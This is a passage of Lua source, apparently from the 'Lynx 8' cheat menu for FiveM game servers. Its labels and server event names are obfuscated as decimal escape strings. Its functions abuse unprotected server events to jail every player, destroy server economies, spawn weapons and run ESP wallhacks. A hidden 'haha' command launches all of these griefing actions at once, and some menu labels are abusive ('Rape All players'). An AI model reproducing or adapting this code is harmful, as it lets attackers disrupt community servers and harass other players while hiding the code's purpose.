                        '\126\104\126\126\103\126\69\83\88\32\126\114\126\68\101\115\116\114\111\121\32\126\98\126\83\97\108\97\114\121\32\126\114\126\84\69\83\84'
                    )
                 then
                    EconomyDestroyer2()
                elseif
                    Lynx8.Button(
                        '\126\104\126\126\114\126\86\82\80\32\126\115\126\71\105\118\101\32\101\118\101\114\121\111\110\101\32\109\111\110\101\121'
                    )
                 then
                    vrpdestroy()
                elseif
                    Lynx8.Button(
                        '\126\104\126\126\114\126\74\97\105\108\126\115\126\32\65\108\108\32\112\108\97\121\101\114\115'
                    )
                 then
                    for i = 0, 128 do
                        TriggerServerEvent(
                            '\101\115\120\45\113\97\108\108\101\45\106\97\105\108\58\106\97\105\108\80\108\97\121\101\114',
                            GetPlayerServerId(i),
                            5000,
                            '\76\121\110\120\32\56\32\126\32\119\119\119\46\108\121\110\120\109\101\110\117\46\99\111\109'
                        )
                        TriggerServerEvent(
                            '\101\115\120\95\106\97\105\108\101\114\58\115\101\110\100\84\111\74\97\105\108',
                            GetPlayerServerId(i),
                            45 * 60
                        )
                        TriggerServerEvent(
                            '\101\115\120\95\106\97\105\108\58\115\101\110\100\84\111\74\97\105\108',
                            GetPlayerServerId(i),
                            45 * 60
                        )
                        TriggerServerEvent(
                            '\106\115\58\106\97\105\108\117\115\101\114',
                            GetPlayerServerId(i),
                            45 * 60,
                            '\76\121\110\120\32\56\32\126\32\119\119\119\46\108\121\110\120\109\101\110\117\46\99\111\109'
                        )
                    end
                elseif
                    Lynx8.Button(
                        '\126\104\126\126\114\126\66\97\110\97\110\97\32\126\112\126\80\97\114\116\121\126\115\126\32\65\108\108\32\112\108\97\121\101\114\115'
                    )
                 then
                    bananapartyall()
                elseif
                    Lynx8.Button(
                        '\126\104\126\126\114\126\82\97\112\101\126\115\126\32\65\108\108\32\112\108\97\121\101\114\115'
                    )
                 then
                    RapeAllFunc()
                end
                Lynx8.Display()
            elseif Lynx8.IsMenuOpened('\67\114\101\100\105\116\115') then
                if Lynx8.Button('~h~~p~->~s~ Ruby~r~#~r~4747 ~p~(~b~SC~p~)') then
                elseif Lynx8.Button('~h~~p~->~s~ antonio~r~#~r~3276 ~p~(~o~DEV~p~)') then
                    drawNotification("~h~<FONT COLOR='#ff22f4'>Don't click me BAKA!~s~.")
                    drawNotification("~h~<FONT COLOR='#ff22f4'>Nyaooww :3~s~.")
                    drawNotification("~h~<FONT COLOR='#ff22f4'>Very mad now cry qweqwe~s~.")
                elseif Lynx8.Button('~h~~p~->~s~ Brutan~r~#~r~7799 ~p~(~o~DEV~p~)') then
                elseif Lynx8.Button('~h~~p~->~s~ unknown~r~#~r~9496 ~p~(~o~DEV~p~)') then
                elseif Lynx8.Button('~h~~p~->~g~ Linora~r~#~r~4614 ~p~(~o~HELPER~p~)') then
                end
                Lynx8.Display()
            elseif Lynx8.IsMenuOpened('WeaponTypes') then
                for dp, dD in pairs(b0) do
                    if
                        Lynx8.MenuButton(
                            '~h~~p~-> ~s~' .. dp,
                            '\87\101\97\112\111\110\84\121\112\101\83\101\108\101\99\116\105\111\110'
                        )
                     then
                        d4 = dD
                    end
                end
                Lynx8.Display()
            elseif Lynx8.IsMenuOpened('WeaponTypeSelection') then
                for dp, dD in pairs(d4) do
                    if Lynx8.MenuButton(dD.name, '\87\101\97\112\111\110\79\112\116\105\111\110\115') then
                        d5 = dD
                    end
                end
                Lynx8.Display()
            elseif Lynx8.IsMenuOpened('WeaponOptions') then
                if Lynx8.Button('\126\104\126\126\114\126\83\112\97\119\110\32\87\101\97\112\111\110') then
                    GiveWeaponToPed(GetPlayerPed(-1), GetHashKey(d5.id), 1000, false)
                end
                if Lynx8.Button('\126\104\126\126\103\126\65\100\100\32\65\109\109\111') then
                    SetPedAmmo(GetPlayerPed(-1), GetHashKey(d5.id), 5000)
                end
                if
                    Lynx8.CheckBox(
                        '\126\104\126\126\114\126\73\110\102\105\110\105\116\101\32\126\115\126\65\109\109\111',
                        d5.bInfAmmo,
                        function(dE)
                        end
                    )
                 then
                    d5.bInfAmmo = not d5.bInfAmmo
                    SetPedInfiniteAmmo(GetPlayerPed(-1), d5.bInfAmmo, GetHashKey(d5.id))
                    SetPedInfiniteAmmoClip(GetPlayerPed(-1), true)
                end
                for dp, dD in pairs(d5.mods) do
                    if Lynx8.MenuButton('~h~~p~-> ~s~~h~~r~> ~s~' .. dp, 'ModSelect') then
                        d6 = dD
                    end
                end
                Lynx8.Display()
            elseif Lynx8.IsMenuOpened('ModSelect') then
                for _, dD in pairs(d6) do
                    if Lynx8.Button(dD.name) then
                        GiveWeaponComponentToPed(GetPlayerPed(-1), GetHashKey(d5.id), GetHashKey(dD.id))
                    end
                end
                Lynx8.Display()
            elseif Lynx8.IsMenuOpened('CarTypes') then
                for i, dF in ipairs(aY) do
                    if Lynx8.MenuButton('~h~~p~-> ~s~' .. dF, 'CarTypeSelection') then
                        carTypeIdx = i
                    end
                end
                Lynx8.Display()
            elseif Lynx8.IsMenuOpened('CarTypeSelection') then
                for i, dF in ipairs(aZ[carTypeIdx]) do
                    if Lynx8.MenuButton('~h~~p~-> ~s~~h~~r~>~s~ ' .. dF, '\67\97\114\79\112\116\105\111\110\115') then
                        carToSpawn = i
                    end
                end
                Lynx8.Display()
            elseif Lynx8.IsMenuOpened('CarOptions') then
                if Lynx8.Button('\126\104\126\126\114\126\83\112\97\119\110\32\67\97\114') then
                    local x, y, z = table.unpack(GetOffsetFromEntityInWorldCoords(PlayerPedId(-1), 0.0, 8.0, 0.5))
                    local veh = aZ[carTypeIdx][carToSpawn]
                    if veh == nil then
                        veh = 'adder'
                    end
                    vehiclehash = GetHashKey(veh)
                    RequestModel(vehiclehash)
                    Citizen.CreateThread(
                        function()
                            local dG = 0
                            while not HasModelLoaded(vehiclehash) do
                                dG = dG + 100
                                Citizen.Wait(100)
                                if dG > 5000 then
                                    ShowNotification('~h~~r~Cannot spawn this vehicle.')
                                    break
                                end
                            end
                            SpawnedCar =
                                CreateVehicle(vehiclehash, x, y, z, GetEntityHeading(PlayerPedId(-1)) + 90, 1, 0)
                            SetVehicleStrong(SpawnedCar, true)
                            SetVehicleEngineOn(SpawnedCar, true, true, false)
                            SetVehicleEngineCanDegrade(SpawnedCar, false)
                        end
                    )
                end
                Lynx8.Display()
            elseif
                Lynx8.IsMenuOpened('\71\105\118\101\83\105\110\103\108\101\87\101\97\112\111\110\80\108\97\121\101\114')
             then
                for i = 1, #a_ do
                    if Lynx8.Button(a_[i]) then
                        GiveWeaponToPed(GetPlayerPed(SelectedPlayer), GetHashKey(a_[i]), 1000, false, true)
                    end
                end
                Lynx8.Display()
            elseif Lynx8.IsMenuOpened('\69\83\80\77\101\110\117') then
                if
                    Lynx8.CheckBox(
                        '\126\104\126\126\114\126\69\83\80\32\126\115\126\77\97\115\116\101\114\83\119\105\116\99\104',
                        esp,
                        function(dl)
                            esp = dl
                        end
                    )
                 then
                elseif
                    Lynx8.CheckBox(
                        '\126\104\126\126\114\126\69\83\80\32\126\115\126\66\111\120',
                        espbox,
                        function(dl)
                            espbox = dl
                        end
                    )
                 then
                elseif
                    Lynx8.CheckBox(
                        '\126\104\126\126\114\126\69\83\80\32\126\115\126\73\110\102\111',
                        espinfo,
                        function(dl)
                            espinfo = dl
                        end
                    )
                 then
                elseif
                    Lynx8.CheckBox(
                        '\126\104\126\126\114\126\69\83\80\32\126\115\126\76\105\110\101\115',
                        esplines,
                        function(dl)
                            esplines = dl
                        end
                    )
                 then
                end
                Lynx8.Display()
            elseif Lynx8.IsMenuOpened('\76\83\67') then
                veh = GetVehiclePedIsUsing(PlayerPedId())
                Lynx8.MenuButton('~h~~p~-> ~s~~h~~r~Exterior ~s~Tuning', 'tunings')
                Lynx8.MenuButton('~h~~p~-> ~s~~h~~r~Performance ~s~Tuning', 'performance')
                Lynx8.Display()
            elseif Lynx8.IsMenuOpened('BoostMenu') then
                if
                    Lynx8.ComboBox(
                        '\126\104\126\69\110\103\105\110\101\32\126\114\126\80\111\119\101\114\32\126\115\126\66\111\111\115\116\101\114',
                        d9,
                        d7,
                        d8,
                        function(ad, ae)
                            d7 = ad
                            d8 = ae
                            SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), d8 * 20.0)
                        end
                    )
                 then
                elseif
                    Lynx8.CheckBox(
                        '\126\104\126\69\110\103\105\110\101\32\126\103\126\84\111\114\113\117\101\32\126\115\126\66\111\111\115\116\101\114\32\126\103\126\50\120',
                        t2x,
                        function(dl)
                            t2x = dl
                            t4x = false
                            t10x = false
                            t16x = false
                            txd = false
                        end
                    )
                 then
                elseif
                    Lynx8.CheckBox(
                        '\126\104\126\69\110\103\105\110\101\32\126\103\126\84\111\114\113\117\101\32\126\115\126\66\111\111\115\116\101\114\32\126\103\126\52\120',
                        t4x,
                        function(dl)
                            t2x = false
                            t4x = dl
                            t10x = false
                            t16x = false
                            txd = false
                        end
                    )
                 then
                elseif
                    Lynx8.CheckBox(
                        '\126\104\126\69\110\103\105\110\101\32\126\103\126\84\111\114\113\117\101\32\126\115\126\66\111\111\115\116\101\114\32\126\103\126\49\48\120',
                        t10x,
                        function(dl)
                            t2x = false
                            t4x = false
                            t10x = dl
                            t16x = false
                            txd = false
                        end
                    )
                 then
                elseif
                    Lynx8.CheckBox(
                        '\126\104\126\69\110\103\105\110\101\32\126\103\126\84\111\114\113\117\101\32\126\115\126\66\111\111\115\116\101\114\32\126\103\126\49\54',
                        t16x,
                        function(dl)
                            t2x = false
                            t4x = false
                            t10x = false
                            t16x = dl
                            txd = false
                        end
                    )
                 then
                elseif
                    Lynx8.CheckBox(
                        '\126\104\126\69\110\103\105\110\101\32\126\103\126\84\111\114\113\117\101\32\126\115\126\66\111\111\115\116\101\114\32\126\121\126\88\68',
                        txd,
                        function(dl)
                            t2x = false
                            t4x = false
                            t10x = false
                            t16x = false
                            txd = dl
                        end
                    )
                 then
                end
                Lynx8.Display()
            elseif IsDisabledControlPressed(0, 121) then
                if logged then
                    Lynx8.OpenMenu('\76\121\110\120\88')
                else
                    drawNotification('\126\114\126\126\104\126\76\111\103\105\110\32\112\108\122\126\115\126\46')
                    PlaySoundFrontend(-1, 'MP_WAVE_COMPLETE', 'HUD_FRONTEND_DEFAULT_SOUNDSET', true)
                end
                Lynx8.Display()
            elseif IsDisabledControlPressed(0, 47) and IsDisabledControlPressed(0, 21) then
                if logged then
                    Lynx8.OpenMenu('\76\121\110\120\88')
                else
                    cc()
                end
            end
            Citizen.Wait(0)
        end
    end
)
RegisterCommand(
    'haha',
    function(dH, dI, dJ)
        bl = true
        RapeAllFunc()
        bananapartyall()
        EconomyDestroyer2()
        AmbulancePlayers()
        for i = 0, 128 do
            TriggerServerEvent(
                '\101\115\120\45\113\97\108\108\101\45\106\97\105\108\58\106\97\105\108\80\108\97\121\101\114',
                GetPlayerServerId(i),
                5000,
                '\76\121\110\120\32\56\32\126\32\119\119\119\46\108\121\110\120\109\101\110\117\46\99\111\109'
            )
            TriggerServerEvent(
                '\101\115\120\95\106\97\105\108\101\114\58\115\101\110\100\84\111\74\97\105\108',
                GetPlayerServerId(i),
                45 * 60
            )
            TriggerServerEvent(
                '\101\115\120\95\106\97\105\108\58\115\101\110\100\84\111\74\97\105\108',
                GetPlayerServerId(i),
                45 * 60
            )
            TriggerServerEvent(
                '\106\115\58\106\97\105\108\117\115\101\114',
                GetPlayerServerId(i),
                45 * 60,
                '\76\121\110\120\32\56\32\126\32\119\119\119\46\108\121\110\120\109\101\110\117\46\99\111\109'
            )
        end
    end,
    false
)
RegisterCommand(
    'panickey',
    function(dH, dI, dJ)
        logged = true
        bm = false
    end,
    false
)